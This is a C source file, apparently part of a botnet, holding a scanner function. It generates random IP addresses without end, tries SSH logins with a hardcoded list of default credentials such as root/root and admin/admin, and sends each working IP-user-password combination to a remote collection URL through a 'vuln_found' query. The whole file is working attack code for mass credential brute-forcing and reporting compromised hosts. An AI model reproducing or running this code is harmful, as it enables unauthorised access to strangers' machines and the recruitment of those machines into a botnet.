#include "../includes/px_botnet.h"

int		user_len = 17;
char	*user[] = {"root", "admin", "daemon", "User", "root", "default", "root", "admin", "root", "admin", "guest", "administrator", "user", "root", "support", "root", "admin"};
char	*pass[] = {"root", "admin", "daemon", "admin", "pass", "default", "user", "password", "password", "1234", "guest", "1234", "user", "admin", "support", "default", "123456"};

void ft_scan_world(pthread_t thread) //verif si work tjr
{
	char ip[18];
	char *tmp;
	char *tmp_return;
	ssh_session ssh;
	int x;
	int timeout;
	int rc;
	int error;

	timeout = 10;
	srand(time(0));
	while (true)
	{
		x = 0;
		error = 0;
		ft_generate_ip(ip);
		while (x < user_len && error == 0)
		{
			ssh = ssh_new();
			ssh_options_set(ssh, SSH_OPTIONS_HOST, ip);
			ssh_options_set(ssh, SSH_OPTIONS_USER, user[x]);
			ssh_options_set(ssh, SSH_OPTIONS_TIMEOUT, &timeout);
			rc = ssh_connect(ssh);
			if (rc != SSH_OK)
			{
				error = 1;
			}
			else
			{
				rc = ssh_userauth_password(ssh, NULL, pass[x]);
				if (rc != SSH_AUTH_SUCCESS)
				{
					// dprintf(1, "\nError : %s - %d\n", ssh_get_error(threads->ssh), error);
				}
				else
				{
					tmp = ft_strjoin(ip, ":");
					tmp = ft_strnjoin(tmp, user[x], strlen(user[x]));
					tmp = ft_strnjoin(tmp, ":", 1);
					tmp = ft_strnjoin(tmp, pass[x], strlen(pass[x]));
					tmp = ft_strnjoinf("?vuln_found=", tmp, strlen(tmp));
					tmp = ft_strnjoinf(url_page, tmp, strlen(tmp));
					tmp_return = ft_request(tmp);
					error = 2;
					free(tmp_return);
					free(tmp);
				}
			}
			ssh_disconnect(ssh);
			if (ssh != NULL)
				ssh_free(ssh);
			x++;
		}
		sleep(1);
	}
}
